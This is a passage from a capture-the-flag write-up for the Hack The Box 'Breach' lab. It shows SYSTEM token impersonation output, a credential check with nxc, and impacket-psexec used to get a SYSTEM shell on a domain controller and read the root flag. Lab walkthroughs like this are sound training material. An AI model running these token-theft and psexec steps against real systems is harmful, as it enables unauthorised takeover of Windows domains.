[+] Searching for System Token...
[+] PID: 928 | Token: 0x760 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 1048
[+] Current Command Length: 34 characters
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 1388

[+] Process Output:
The command completed successfully.
```

I'll check with nxc.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ nxc smb breach.vl -u Administrator -p 'newpass00**' 
SMB         10.129.9.183    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.9.183    445    BREACHDC         [+] breach.vl\Administrator:newpass00** (Pwn3d!)
```

Nice, for the last step, I'll use psexec from impacket.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ impacket-psexec Administrator:'newpass00**'@breach.vl                            
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on breach.vl.....
[*] Found writable share ADMIN$
[*] Uploading file ywEbvdQX.exe
[*] Opening SVCManager on breach.vl.....
[*] Creating service qPnD on breach.vl.....
[*] Starting service qPnD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.558]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

We're succesfully SYSTEM, and here's the root flag.

```bash
PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         4/17/2025  12:37 AM             32 root.txt                                                             


PS C:\Users\Administrator\Desktop> cat root.txt
fc98f4....
```
